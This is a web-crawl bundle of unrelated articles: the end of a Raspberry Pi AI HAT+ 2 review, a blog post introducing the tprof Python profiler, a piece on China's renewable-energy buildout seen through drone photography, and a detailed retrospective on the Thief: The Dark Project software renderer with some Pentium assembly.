    &lt;p&gt;It seems like with most hardware with "AI" in the name, it's hardware-first, then software comes laterâif it comes at all. At least with Raspberry Pi's track record, the software does come, it's just... often the solutions are only useful in tiny niche use cases.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;8 GB of RAM is useful, but it's not quite enough to give this HAT an advantage over just paying for the bigger 16GB Pi with more RAM, which will be more flexible and run models faster.&lt;/p&gt;
    &lt;p&gt;The main use case for this HAT might be in power-constrained applications where you need both vision processing and inferencing. But even there... it's hard to say "yes, buy this thing", because for just a few more watts, the Pi could achieve better performance for inference in tandem with the $70 AI Camera or the $110 AI HAT+ for the vision processing.&lt;/p&gt;
    &lt;p&gt;Outside of running tiny LLMs in less than 10 watts, maybe the idea is you use the AI HAT+ 2 as a development kit for designing devices using the 10H like self-checkout scanners (which might not even run on a Pi)? I'm not sure.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;With the obvious caveat that the VRAM on GPUs runs a lot faster than equivalent LPDDR4 RAM on a Pi! ↩︎&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;

    &lt;head rend="h1"&gt;Python: introducing tprof, a targeting profiler&lt;/head&gt;
    &lt;p&gt;Profilers measure the performance of a whole program to identify where most of the time is spent. But once youâve found a target function, re-profiling the whole program to see if your changes helped can be slow and cumbersome. The profiler introduces overhead to execution and you have to pick out the stats for the one function you care about from the report. I have often gone through this loop while optimizing client or open source projects, such as when I optimized Djangoâs system checks framework (previous post).&lt;/p&gt;
    &lt;p&gt;The pain here inspired me to create tprof, a targeting profiler for Python 3.12+ that only measures the time spent in specified target functions. Use it to measure your program before and after an optimization to see if it made any difference, with a quick report on the command line.&lt;/p&gt;
    &lt;p&gt;For example, say youâve realized that creating &lt;code&gt;pathlib.Path&lt;/code&gt; objects is the bottleneck for your code. You could run tprof like so:&lt;/p&gt;
    &lt;head rend="h2"&gt;Benchmark with comparison mode&lt;/head&gt;
    &lt;p&gt;Sometimes when optimizing code, you want to compare several functions, such as âbeforeâ and âafterâ versions of a function youâre optimizing. tprof supports this with its comparison mode, which adds a âdeltaâ column to the report showing how much faster or slower each function is compared to a baseline.&lt;/p&gt;
    &lt;p&gt;For example, given this code:&lt;/p&gt;
    &lt;code&gt;def before():
    total = 0
    for i in range(100_000):
        total += i
    return total


def after():
    return sum(range(100_000))


for _ in range(100):
    before()
    after()
&lt;/code&gt;
    &lt;p&gt;â¦you can run tprof like this to compare the two functions:&lt;/p&gt;
    &lt;code&gt;$ tprof -x -t before -t after -m example
ð¯ tprof results:
 function         calls total  mean Â± Ï      min â¦ max   delta
 example:before()   100 227ms   2ms Â± 34Î¼s   2ms â¦ 2ms   -
 example:after()    100  86ms 856Î¼s Â± 15Î¼s 835Î¼s â¦ 910Î¼s -62.27%
&lt;/code&gt;
    &lt;p&gt;The output shows that &lt;code&gt;after()&lt;/code&gt; is about 60% faster than &lt;code&gt;before()&lt;/code&gt;, in this case.&lt;/p&gt;
    &lt;head rend="h2"&gt;Python API&lt;/head&gt;
    &lt;p&gt;tprof also provides a Python API via a context manager / decorator, &lt;code&gt;tprof()&lt;/code&gt;. Use it to profile functions within a specific block of code.&lt;/p&gt;
    &lt;p&gt;For example, to recreate the previous benchmarking example within a self-contained Python file:&lt;/p&gt;
    &lt;code&gt;from tprof import tprof


def before():
    total = 0
    for i in range(100_000):
        total += i
    return total


def after():
    return sum(range(100_000))


with tprof(before, after, compare=True):
    for _ in range(100):
        before()
        after()
&lt;/code&gt;
    &lt;p&gt;â¦which produces output like:&lt;/p&gt;
    &lt;code&gt;$ python example.py
ð¯ tprof results:
 function          calls total  mean Â± Ï      min â¦ max delta
 __main__:before()   100 227ms   2ms Â± 83Î¼s   2ms â¦ 3ms -
 __main__:after()    100  85ms 853Î¼s Â± 22Î¼s 835Î¼s â¦ 1ms -62.35%
&lt;/code&gt;
    &lt;head rend="h2"&gt;How it works&lt;/head&gt;
    &lt;p&gt;tprof uses Pythonâs &lt;code&gt;sys.monitoring&lt;/code&gt;, a new API introduced in Python 3.12 for triggering events when functions or lines of code execute. &lt;code&gt;sys.monitoring&lt;/code&gt; allows tprof to register callbacks for only specific target functions, meaning it adds no overhead to the rest of the program. Timing is done in C to further reduce overhead.&lt;/p&gt;
    &lt;p&gt;Thanks to Mark Shannon for contributing sys.monitoring to CPython! This is the second time Iâve used itâthe first time was for tracking down an unexpected mutation (see previous post).&lt;/p&gt;
    &lt;head rend="h2"&gt;Fin&lt;/head&gt;
    &lt;p&gt;If tprof sounds useful to you, please give it a try and let me know what you think! Install tprof from PyPI with your favourite package manager.&lt;/p&gt;
    &lt;p&gt;May you hit your Q1 targets,&lt;/p&gt;

    &lt;p&gt;Last year China installed more than half of all wind and solar added globally. In May alone, it added enough renewable energy to power Poland, installing solar panels at a rate of roughly 100 every second.&lt;/p&gt;
    &lt;p&gt;The massive buildout is happening across the country, from crowded eastern cities increasingly topped by rooftop solar panels to remote western deserts where colossal wind farms sprawl across the landscape.&lt;/p&gt;
    &lt;p&gt;“From the ground, it’s hard to grasp the scale of these power plants,” said Chinese photographer Weimin Chu. “But when you rise into the air, you can see the geometry, the rhythm — and their relationship with the mountains, the desert, the sea.”&lt;/p&gt;
    &lt;p&gt;Chu has spent three years capturing the shift underway using drones to photograph power plants from overhead. His work, which draws from the visual language of traditional Chinese ink paintings, was featured last year in an award-winning exhibition, presented by Greenpeace. A selection of those photos is reproduced here.&lt;/p&gt;
    &lt;p&gt;“I started out just shooting landscapes,” Chu said. “But when I traveled to places like Guizhou, Yunnan, and Qinghai in 2022, I kept seeing wind farms and solar power plants appear in my camera frame. I realized this is the story of our time — and almost no one is documenting it in a systematic way.”&lt;/p&gt;

    &lt;p&gt;In 1998 Looking Glass Studios released the stealth game Thief: The Dark Project. This was just as 3D hardware acceleration was taking off, so due to the development cycle it didn't use hardware acceleration; it was a purely software-rendered game.&lt;/p&gt;
    &lt;p&gt;I was the primary author of the core rendering technology in Thief (although I didn't write the object or character renderers), as well as some related bits and pieces. The same rendering engine, modified by others to use 3D hardware acceleration, also did the rendering for System Shock 2 and Thief 2.&lt;/p&gt;
    &lt;p&gt;The engine was written somewhat contemporaneously with Quake (despite the game being released much later), and the basic appearance strongly resembles Quake. Many of its technologies were copied from or inspired by Quake, but in many cases the way it works is slightly or significantly different.&lt;/p&gt;
    &lt;p&gt;The Quake software rendering was thoroughly documented by Michael Abrash in a series of articles which were reprinted in his Graphics Programming Black Book. The techniques used in Thief were never written up and I thought it might be nice to write them down for once, even if they're now totally irrelevant. I'll try to describe them relative to the probably-more-familiar Quake approaches where possible.&lt;/p&gt;
    &lt;p&gt;Important contemporaneous games with similar rendering technology:&lt;/p&gt;
    &lt;p&gt;Looking Glass games previous to Thief had used grid-based worlds. System Shock 1 and the Ultima Underworlds computed visibility using a grid-based traversal. Thief, however, was totally free-form, so I had to start from scratch to design the Thief engine (which started long before Thief, and I imagine even before we shipped Terra Nova: Strike Force Centauri, which I worked on).&lt;/p&gt;
    &lt;p&gt;Thief was based on the portal-and-cell idea for visibility and occlusion published by Seth Teller in his 1992 PhD dissertation. In fact, the Thief world renderer was called "Portal", but since that name has a newer popular meaning I'll just call it "Thief" or "the Thief engine" (but there was far far more to the Thief engine than just the renderer, such as the object system, AI, physics, and I had nothing to do with them; I didn't write "the Thief engine", just the renderer).&lt;/p&gt;
    &lt;p&gt;I was originally exploring this idea as research for an imagined holy grail for Looking Glass: developing an "indoor-outdoor" CRPG, since the previous LGS CRPGs (Ultima Underworld 1 &amp;amp; 2, System Shock 1) had all been "indoor" dungeons, but we also had this outdoor tech for Terra Nova, and many of us felt we'd want to eventually make a hypothetical Underworld 3 or something which would have dungeons and exteriors and buildings and what not (this was before Daggerfall). In trying to imagine how we could put some kind of a hole in the Terra Nova terrain to incorporate dungeons, I realized that portals could be used to seamlessly integrate multiple independent renderers (like an indoor renderer and an outdoor renderer) by putting portals at the boundaries, so I wrote up a long document over one Christmas vacation documenting my thoughts along those lines. Then I guess I had all these ideas bouncing around in my head, and I knew we didn't have any idea how to do non-grid stuff, and it seemed viable to just try to make a full indoor renderer using portals... so I went ahead and tackled implementing one as research.&lt;/p&gt;
    &lt;p&gt;The portal-and-cell idea was used offline by Quake for computing its precomputed PVS ("potentially visible set")--also described in Seth Teller's dissertation--but Thief used it at runtime; Thief precomputed the portals and cells, but didn't precompute any further visibility information. (I believe Descent, which was released before I even started writing the Thief engine, had already done this, but I don't know the details.)&lt;/p&gt;
    &lt;p&gt;The Thief engine kept a representation of the level in which the open areas (the areas you could see and/or walk) were divided into convex polyhedra known as cells. Each cell contained zero or more visible "world polygons" along the boundaries of the cell that were the visible surfaces of the world. Cells which adjoined other cells had special boundary polygons called "portals" which marked the adjacency between the cells. If you could see into a given cell, then you could see into adjoining cells through the portals to them.&lt;/p&gt;
    &lt;p&gt;To determine what part of the level was currently visible and needed rendering, the engine conducted a breadth-first traversal of the portals and cells starting from the location of the viewpoint. As each portal was traversed, the cells reached were added to the visible list. Each considered portal was transformed in 3D, checked if it was back-facing, and if not it was projected to 2D. Then a "bounding octagon" was generated, which consisted of a regular 2D bounding box and a 45-degree rotated bounding box.&lt;/p&gt;
    &lt;p&gt;If a portal led from cell A to cell B, then we compared that portal's bounding octagon to a bounding octagon of the visiblity of cell A. If the two didn't overlap, then the portal wasn't actually visible. If it was visible, then the intersection of cell A's octagon and the portal's octagon was the part of cell B that was visible through this portal, so it added that to the list. (It was possible you would see into cell B through multiple paths, so the engine had to accumulate all the visible regions, which it did by simply keeping a conservative bounding octagon of all the incoming path octagons along paths. If you had two small view paths into one cell, the two at opposite ends of the cell, the bounding octagon would be much bigger, typically the size of the whole cell.) The cell containing the viewpoint was always fully visible.&lt;/p&gt;
    &lt;p&gt;Quake precomputed similar information: for each cell, Quake stored the list of all other cells that were visible from anywhere in that cell. This result could be less tight; for example, if you had a long corridor with many side rooms, and that long corridor was a single cell, then in Quake it would always try to render all the side rooms, whereas Thief would only try to render the entry cell to each of the side rooms (since those cells would always be adjacent to the corridor and visible), but Thief could cull the rooms themselves if they weren't currently visible.&lt;/p&gt;
    &lt;p&gt;Full cell-portal-analysis didn't scale well to higher polygon counts, so the engine was limping by the time the last game shipped with it (in other words, it had a lot of overhead when hardware accelerated).&lt;/p&gt;
    &lt;p&gt;Quake reduced overdraw by using a span-buffering ("edge list") technique in which world surfaces were (conceptually) drawn front-to-back and each pixel was only drawn exactly once.&lt;/p&gt;
    &lt;p&gt;Thief drew polygons back-to-front, so they did overdraw each other. Thief's overdraw was already reduced compared to Quake's "naive" (pre-edge-list) overdraw because of the tighter bounds from traversing the portals dynamically, as described above.&lt;/p&gt;
    &lt;p&gt;Thief further reduced overdraw by clipping each rendered world polygon by the bounding octagon for the visibility of the cell containing that polygon. (This is part of why bounding octagons were used, as they significantly reduced overdraw in some cases compared to just using bounding boxes. In the limit if we had clipped to the exact portals leading to each cell, this would have resulted in drawing each pixel only once as well.) I don't have any recollection of what our typical overdraw was using this approach.&lt;/p&gt;
    &lt;p&gt;For this to work, Thief had to store world polygons in cells. This means that world polygons that extended through multiple cells had to be split; Quake was often able to preserve those as single polygons since it stored the polygons in a BSP tree directly on split planes. I'm not sure how much difference this made, though, since both Thief and Quake also had to split polygons for surface caching.&lt;/p&gt;
    &lt;p&gt;The 2D clipping to the bounding octagon meant that many Thief polygons ended up being rendered as 8-sided polygons. This wasn't a problem. In fact, clipping was straightforward and efficient since it was purely 2D along simple axes, and there were no S,T (i.e. U,V) texture coordinates on polygon vertices, since Thief used a technique I'd previously published in the PC Game Programmer's Encyclopedia in which the texture coordinates were defined as a 3D vector basis independent of the vertices, and then texture coordinates for spans and pixels were computed directly from the basis vectors.&lt;/p&gt;
    &lt;p&gt;The skybox was drawn just by tagging polygons with a special texture, then when drawing it, taking the transformed 2D polygon and clipping it to each skybox polygon and using the skybox texture mapping for each of them, or something like that. I don't remember 100%.&lt;/p&gt;
    &lt;p&gt;After discovering all the cells that needed rendering, Thief would decide which objects needed rendering. Only objects that were in visible cells might need rendering. However, Thief also computed a 2D bounding box (or probably octagon) of each potentially visible object and compared it against the bounding octagon for any cells containing the object. (Quake had nothing like this since it didn't process portals at runtime.)&lt;/p&gt;
    &lt;p&gt;Because the Thief engine was better about rejecting invisible cells entirely, and was able to reject objects that weren't currently visible even if the cells containing them were, Thief could generally handle more object-dense worlds than a renderer made with Quake technology could have. You couldn't necessarily have more visible objects at once, but you could put more objects in overall as long as you limited where you could see them from, and so Thief generally was able to have well-stocked kitchens and dining tables and sideboards and such.&lt;/p&gt;
    &lt;p&gt;But this was just dumb luck as I hadn't chosen these algorithms for that reason in particular, especially as the engine development long preceded the eventual morphing of the game design into Thief.&lt;/p&gt;
    &lt;p&gt;Quake rendered objects by generating a z-buffer from the world polygons (even though the world polygons themselves didn't z-test), and then testing and updating that z-buffer when rendering objects.&lt;/p&gt;
    &lt;p&gt;Thief didn't use a z-buffer. Instead, Thief drew the world back-to-front ("painter's algorithm"), and interleaved rendering of world polygons and objects to make them appear to occlude each other appropriately.&lt;/p&gt;
    &lt;p&gt;Many games in the software rendering era (which rarely used z-buffers) exhibited sorting issues where objects would become visible through walls or invisible behind walls they shouldn't be, and portals/cells didn't offer any special guarantees that would avoid this problem. (For example, Descent exhibited such problems.)&lt;/p&gt;
    &lt;p&gt;This really bothered me and I worked very hard to fix it. The sorting algorithm in Thief is the most complicated painter's algorithm sorter I've every heard of; I remember having to write a little mathematical proof at one point for one part of it.&lt;/p&gt;
    &lt;p&gt;I don't remember the details, but I'll try and sketch out some of the issues and how it probably worked.&lt;/p&gt;
    &lt;p&gt;Originally the cells were sorted based on the portal-traversal-discovery order, which provided a topological front-to-back sort order that could be reversed for back-to-front rendering. However, there were some issues and so by the time Thief shipped the cells were actually being sorted by a BSP tree. This meant that the sort order was very far from a breadth-first search; if you were near the rootmost split plane, the draw order could feature very-close-to-the-viewer cells drawn before very-far-from-the-viewer cells if the cells and viewer happened to fall on the appropriate sides of some BSP split plane.&lt;/p&gt;
    &lt;p&gt;Because of the BSP tree there was no danger that the world polygons would render in the wrong order, but there was some danger that objects could sort wrong with respect to each other or the world polygons. To avoid this, the Thief engine (again, I'm kind of guessing here) conceptually numbered the cells in the order it would draw them. An object in cell N would normally render immediately after drawing the (inward-facing) world polygons in cell N and before drawing the walls of cell N+1. However, sometimes objects would lie in multiple cells. An object in cell M and N, with M &amp;lt; N, would need to be drawn after all the walls of cell M, but the parts of it in cell M might be obscured by walls in cell N or indeed in any of the cells between M and N. (A common case that came up: a corridor (cell) with a niche (cell) holding a torch, with the torch slightly protruding into the corridor. The niche is M, and the corridor is N--e.g. if the viewpoint is in the corridor, then the corridor is "closer" to the viewpoint in a back-to-front rendering sense. For example, one of the walls of the corridor will occlude parts of the niche.)&lt;/p&gt;
    &lt;p&gt;To deal with those complexities, Thief would consider whether it was acceptable to draw a given object in its frontmost cell N (or, indeed, at any point in the draw order between its rearmost and frontmost). To do this it would compute bounding octagons on the objects and on the world polygons and see whether the polygons occluded the objects. If a world polygon was supposed to be "in front" of an object and the bounding octagons intersected, then it wasn't safe to move the object later in the rendering order to a point later than that world polygon.&lt;/p&gt;
    &lt;p&gt;The Thief engine would resolve what range it was valid to draw each object in between backmost and frontmost cells containing that object; if the object was only in one cell it would always be considered as just being in that cell. Once this was determined, Thief then attempted to resolve object-vs-object sorting. Because an object might extend through multiple cells and then be behind or in front of an object that was in a single cell, objects that were only in one cell might need to be moved back or moved forward in the sort order anyway; in other words, the final range of cells that an object might be considered for rendering after might cover a larger range than just between backmost and frontmost containing cell.&lt;/p&gt;
    &lt;p&gt;Thief attempted to use the above ranges to find some sort order for objects, holding the cell sort order fixed, so that objects and world polygons would all inter-sort correctly. (This was where that proof came in.) However, sometimes this was impossible. For example, in the torch-in-the-niche case described above, it's possible for one world polygon in cell N to be occluded by the torch (the wall with the niche on it extending behind the niche), but another world polygon in N to occlude the niche and part of the torch (the wall with the niche on it extend forward towards the viewer). In this case, there is no sort order of objects vs. cells that works, because parts of the torch occlude the cell while parts of the same cell occlude the torch. It would be fixable by interleaving the world polygons from the cell with the torch, instead of always drawing all the world polygons from one cell as a unit, but not all cases could be fixed that way, so Thief actually never did that (it always drew all world polygons from one cell as a unit) -- unless I'm remembering wrong.&lt;/p&gt;
    &lt;p&gt;Instead Thief had an entirely different, extremely expensive mechanism that it fell back on to solve difficult sorting problems. Each object could be "split" into multiple pieces, one per cell. In each cell, only the part of the object which was contained in that cell was rendered. This wasn't done by actually splitting the object, but rather by rendering it multiple times, once for each "piece", and for each piece dynamically clipping the object with a "user clip plane", using similar technology to the frustum clipping that was also being done. (In complex cases, multiple clip planes would be needed; however, it was only ever necessary to clip to portals between the cells the object was in, and not literally clip to all the planes defining each cell.) If this technique was applied, then that part of that object could always be drawn in or after that cell. However, although it didn't increase the per-pixel costs, it required transforming and clipping the object multiple times, so it was rather expensive. (I encouraged designers to place their torches fully inside the niches instead.) This was particularly bad when rendering characters, which were skinned, since I think the skinning transformations would be performed multiple times.&lt;/p&gt;
    &lt;p&gt;This also had another problem: if you had three cells arranged so that the portals between them formed a T, then the dynamic clipping could create t-junctions at the border. These would then cause cracks in the rendering. I don't remember how/if we fixed this.&lt;/p&gt;
    &lt;p&gt;During development I noticed that if you used all the walls of a cell for user clip planes--not just the portals--then if an object interpentrated a wall, it would be clipped away, looking exactly like a z-buffer rendering. Normally these artifacts arose because the game physics allowed an object to interpenetrate briefly, so it was actually better not to clip those objects, and then they wouldn't look (from most angles) like they were going through the wall. But we could've used an effect like that to allow creatures that could move through walls even without though we had no z-buffer.&lt;/p&gt;
    &lt;p&gt;After my positive experience with user clip planes I was frustrated over the next few years that GPUs didn't efficiently/easily support them. (Even in D3D9, they're still done in the pixel shader; although you can use z and stencil to cull more tightly and reduce pixel shading costs.) Of course, with the z-buffer, it's not clear there are lots of use cases, but there's a chicken-and-egg problem to that conclusion.&lt;/p&gt;
    &lt;p&gt;The core technique for rendering texture mapped polygons with decent precomputed shadows is very similar (identical?) to Quake. Thief used light mapping and a surface cache to store the lit surfaces. I refer you to Mike Abrash's articles.&lt;/p&gt;
    &lt;p&gt;My recollection is that we added this to the engine after we (the Thief team) saw the Quake "QTest" release. However, I'm doubtful there really was a Thief team at that point. According to wikipedia, QTest came out February 24, 1996. Terra Nova came out on March 5, 1996, so I guess we had built our final version of Terra Nova by the time QTest was released, but I can't imagine we'd geared up a whole team yet. In fact I don't know for sure when exactly I did the original research version of this engine.&lt;/p&gt;
    &lt;p&gt;At one point objects raycasted to all (or the top N) light sources to determine if they were visible to it or not and turned the entire light on/off over the entire object to simulate objects going in-and-out of shadow. But I don't know if we shipped with this or using the "check the lightmap value on the floor", which I seem to recall we at least considered using for the player's visiblity to guards (to avoid players being tricked/confused by places that appeared to casual inspection to being in shadow).&lt;/p&gt;
    &lt;p&gt;Thief levels were created using Constructive Solid Geometry (CSG) methods, based again on knowledge that that was how Quake worked. Technologically though Thief worked very differently from Quake.&lt;/p&gt;
    &lt;p&gt;The Thief CSG model was "temporal", which maybe I can better explain by analogy to Photoshop. In photoshop, you have layers. Stuff placed in one layer obscures stuff in lower layers, except if you use more interesting blend modes, in which case stuff in a layer changes the stuff visible below it but has no affect on things above it.&lt;/p&gt;
    &lt;p&gt;Algorithmically, you can think of generating the final image by processing each layer in the image sequentially, from back to front, compositing it with the "image so far". At the time each image is processed, the image-so-far contains the accumulated effects of all the earlier (lower) layers, and then the layer is processed and the image-so-far is changed and that layer cannot have any further effect except by data it left in the image-so-far.&lt;/p&gt;
    &lt;p&gt;Normally we think of the photoshop layer model as a stack of 2D layers, but you could instead think of the above algorithm as the model, and think of the layers not as a "vertical" stack but as an ordered sequence of operations to perform. This is what I mean by a temporal model, and this is the model that Thief used for its CSG. (If the vertical photoshop layer stack is a vertical third dimension of the 2D images, then the Thief layering model would be a fourth dimension on the 3D shapes, and thinking about this as four-dimensional space is not very effective.)&lt;/p&gt;
    &lt;p&gt;The Thief CSG took as input a series of "operations" arranged in an order over time. Those operations were "brush placements", where a brush was a 3D convex solid plus a characterization of how the area covered by that solid would be changed by the operation. The entire space started solid, so one brush operation was "carve out a hole in this area"--in other words "change the area covered by this brush to open". For example you would use this to carve out a room. Another placed solid matter; you could use this to create a pillar. Another placed water, and another lava. Because space could be of 4 types (solid, air, water, or lava -- oh hey, the 4 classical elements!), each operation could be considered by which output type it produced. Moreover, we allowed these operations to be selective. For example, the "flood brush" turned air into water, but left all other types alone. This made it easier to fill an area with water--you could construct it entirely with air and then fill the lower half with water. Because of the temporal aspect, you could then go and change some of the water to "air" if you needed to. It would have been possible to make brush types that were much complicated (air turns to water, water turns to solid, solid turns to air, and lava unchanged) but this wasn't actually useful so I think all the brush types were of the unconditional-single-type or conditional-single-type.&lt;/p&gt;
    &lt;p&gt;As with Photoshop layers, the temporal aspect was something under user control; you could move a brush forwards or backwards in time. Unfortunately, this was much harder to visualize (there was no "layers" window) and I'm not sure designers were really thrilled with this.&lt;/p&gt;
    &lt;p&gt;In comparison, Quake started with a level that was all open space and placed solids. It used a more-traditional-CSG explicit-subtraction operation. Water was handled by making all water brushes occur first temporally, so that all the effective temporal sequence of operations was: all air =&amp;gt; some air turns to water =&amp;gt; all solids are placed. Because subtraction was explicit on the solid brushes before they were added to the world, the subtraction couldn't "accidentally" erase water, so there was no need for an explicit temporal model (the set of things you could do in Quake was more limited, but it supported almost everything that mattered in practice--although some designers came up with some strange sequences of operations in Thief to create more complicated shapes).&lt;/p&gt;
    &lt;p&gt;Because Quake levels started empty, Quake had invisible "exterior" surfaces that required a separate process to detect and eliminate. If the level wasn't watertight, then the exterior could be reachable and the automated tools couldn't eliminate it. In contrast, because the Thief level started solid, this was never necessary. (I think Unreal's CSG may have started as solid as well.)&lt;/p&gt;
    &lt;p&gt;I had no idea what I was doing when I implemented the Thief CSG system (despite having the opportunity to pepper John Carmack with questions) so I made a terrible choice. The Thief system worked by dividing the world up into convex polyhedra and keeping track of what each polyhedron's type i.e. air, solid, water, lava, which I call the "medium". To do this, I stored the world as a solid BSP tree; the BSP tree classifies all of space into convex polyhedra (except at the edges where it may have unbounded shapes extending to infinity).&lt;/p&gt;
    &lt;p&gt;Using a BSP tree for this had a performance advantage, but I didn't do it for that reason; I did it because I literally couldn't think of any other way to compute the output. This way I was able to sequentially add each brush to the BSP tree and then apply the medium-transformation-operations to each BSP leaf that the brush contained.&lt;/p&gt;
    &lt;p&gt;But reading the Quake source, it turns out you can do it a different way: intersect every brush with every other brush directly, without a spatial data strucure. By being careful, you can build a growing list of convex polyhedra all of which are non-overlapping. You can then add a spatial data structure to accelerate determining which ones might overlap, but without affecting the computation itself.&lt;/p&gt;
    &lt;p&gt;The difference is that the BSP-tree based CSG tree would have situations where a brush early in the processing would be inserted in the tree early and would introduce a BSP split plane near the root which then extended across the whole level or a significant part of it. This might randomly come close to an edge or vertex of a totally unrelated brush, causing an extra split in that brush and introducing additional epsilon problems. As CSG is already painful numeric geometric algorithms with epsilon problems, introducing this extra uncontrollable problem was terrible. The Thief editor was (is?) notorious for having weird problems where a change to one brush might trigger a failure in the CSG generator at an entirely unrelated place in the level--a failure which meant the level simply failed to "compile".&lt;/p&gt;
    &lt;p&gt;Partway through Thief development I switched everything in the CSG engine from floats to doubles and cranked down the epsilon, which made things better but didn't solve the problem properly, but I realize in hindsight it would have been much, much better to have simply avoided the BSP tree entirely.&lt;/p&gt;
    &lt;p&gt;The epsilon problems were exacerbated by the crazy way I built the polygons and portals directly from the BSP-tree in a t-junc free way by computing a shared mesh along each BSP split plane to guarantee that vertices on one side of the split plane would always have a matching vertex on the other side; this introduced a much more complicated set of invariants that had to be maintained that also had epsilon problems. It meant I didn't have to write a post-processing t-junction eliminator the way Quake did, but in hindsight that would have been better.&lt;/p&gt;
    &lt;p&gt;Looking Glass games prior to Thief such as System Shock 1 and Terra Nova had used a "lines of constant-Z" mapper to perform perspective texture mapping. Those games typically used the perspective texture mapper for large, near polygons, but used an affine mapper for distant polygons.&lt;/p&gt;
    &lt;p&gt;Thief used a custom-written perspective mapper for all polygons. It used the trick used in Quake of issuing a floating-point divide for perspective correction for every N pixels which then executed in parallel with the texture mapping of the next N pixels; this worked because the Pentium would execute the floating-point divide "in the background" if you only used integer instructions after it (the Pentium was not an out-of-order processor in general).&lt;/p&gt;
    &lt;p&gt;Thief computed the perspective correction every 8 pixels (that is, N above was 8). Thief aligned the correction so it occurred on pixels whose x coordinates were multiples of 8. The beginning and ending of a span of pixels could be less than 8, and would call a general-purpose N-pixel mapper, but the 8-pixel spans called a routine that was hardcoded to compute exactly 8 pixels.&lt;/p&gt;
    &lt;p&gt;Because the engine changed over time and was initially used for research, it supported two different formats that textures could be stored in. One was restricted to 256x256 textures, or rather textures with powers-of-two sizes and in which the stride/pitch was always 256. This used an inner loop similar to the one I wrote up for the PCGPE. The second one supported arbitrary non-power-of-two textures but didn't support wrapping. This is the one we switched to when we added surface cached lighting, because padding those textures widths to multiples of 256 would have been far too wasteful. I believe the "step table" indexed-by-carry-flag trick used in this mapper came directly from Mike Abrash.&lt;/p&gt;
    &lt;table&gt;
      &lt;row&gt;
        &lt;cell&gt;Details for x86 programmers: &lt;p&gt;Here is the code for the second pixel of the non-power-of-two texture-mapper-unrolled-8-times:&lt;/p&gt;&lt;quote&gt;adc ebx,edi add eax,ebp sbb edi,edi ; save v carry add esi,edx ; update u mov byte ptr _pt_buffer+1,al mov al,[ebx] mov edi,_pt_step_table[edi*4+4]&lt;/quote&gt;&lt;p&gt;Here is the code for the second pixel of the 256x256 texture-mapper-unrolled-8-times (not used in the shipping game, unless maybe it was used for water surface):&lt;/p&gt;&lt;quote&gt;add esi,edx mov ecx,ebx adc bl,dl add eax,ebp adc bh,dh mov al,[edi+ecx] mov byte ptr _pt_buffer+1,al and ebx,0babebeach&lt;/quote&gt;&lt;p&gt;The spacing of both pieces of code shows that they were optimized for the Pentium; each one uses a nominal 4 cycles per pixel. (They also both would trigger "Partial Register Stalls" on the Pentium Pro.) The Pentium had a 2-cycle "AGI" stall that you couldn't use a register as an address for 2 cycles after it's computed, so you can see the texture fetch (from ebx or edi+ecx) is designed to compute those registers two cycles before the fetch. The full 8-pixel routines use 32 and 33 Pentium-pairs of instructions for 8 pixels (although there's also setup to get the right values into the right registers).&lt;/p&gt;&lt;p&gt;The 0babebeach at the end there is a 0xdeadbeef-style constant that relied on "self-modifying" code to update the constant, a common trick on the 486 and Pentium. Those processor had an "and ebx,memory_location" instruction, but it wasn't single-cycle, whereas "and ebx,#immediate" was single-cycle. This meant there were 9 places in the code that had to be modified (this is an 8-unrolled loop, plus the non-unrolled loop), but only when the texture was changed.&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Unfortunately, I totally missed out on the possibility of reblocking the texture to improve cache usage, which might have allowed significant performance improvements (I don't know); I've heard that Build and other engines did do this, and since the surface cache in Thief was built in 8x8 blocks anyway it probably wouldn't have been hard to support on that end.&lt;/p&gt;
    &lt;p&gt;Looking Glass games generally demanded flexibility, and graphics engines faced with that need for flexibility often had a combinatorial explosion of texture mappers to handle all the different cases. The texture mappers I wrote for Thief sacrificed a litttle performance for the sake of simplicity and maintainability and maximum flexibility; the texture mapping routines above ended with an indirect branch which would branch to a routine that would decide what to do with the 8 pixels that had just been written into a temporary buffer.&lt;/p&gt;
    &lt;p&gt;There were two kinds of functions that could be invoked at this point. The most common kind was one which wrote to the "framebuffer" (which was actually just a block of RAM somewhere that would be blitted to the screen later) and returned from the original function call that invoked the texture mapper chain. The other kind of function would read the pixels from the temporary buffer, modify them, and write them back to the temporary buffer, then jump to yet another function. You could chain arbitrary numbers of these processing functions, in theory, not that this turned out to be necessary.&lt;/p&gt;
    &lt;p&gt;The codebase had a bunch of these functions:&lt;/p&gt;
    &lt;p&gt;Most of those weren't used, I think. Paletted lighting in particular required setting up the palette in a particular way, and I used this in the original research engine to demo a gouraud-shaded level running at 640x400 at 20-ish fps on a Pentium 90. The level was a retextured version of Doom 1 E1M1, using a texture made by Kurt Bickenbach. He and I iterated a bit trying to figure out how to make textures that would look good and not too banded in 8-bit using paletted lighting, and we got some visually pleasing results, but in the end paletted lighting was too limited, so we abandoned it. (It was too limited artistically, and it couldn't do pitch black properly; when we ended up with a shadow-oriented game it was clearly wrong, but I think it had been abandoned long before due to the first issue.) Abandoning it meant abandoning hitting that frame rate/resolution target as well, but in the long run this didn't matter that much because LGS games were complicated enough that it's not like we spent 95% of the frame time in the renderer anyway, and we didn't ship it for a long time anyway.&lt;/p&gt;
    &lt;p&gt;The engine supported specifying an arbitrary color look-up table ("clut") for each portal, and coloring everything seen through that portal with that clut. This wasn't done by applying this as a post-process on that portal surface, which would have used extra "fill rate", but by storing cluts (and concatenating them into new cluts) and applying them while rendering surfaces seen through the portal. This effect could have been used to make force fields or such things, although it ended up underutilized. (Note, though, that if a single cell were visible through multiple paths, and the paths had different sequences of cluts, there was no correct way to render it; the Thief engine chose randomly. Probably there was no good solution to this problem, but since it was never exercised, it didn't matter.)&lt;/p&gt;
    &lt;p&gt;During development, this was used to make water "foggy", where the more underwater portals away something was, the more opaque the water became. However, this looked pretty terrible as it showed the portal boundaries clearly and although we had all gotten used to it since it was in the engine for years, I did eventually turn off the portal-varying underwater fog, replacing it with a fixed underwater fog.&lt;/p&gt;
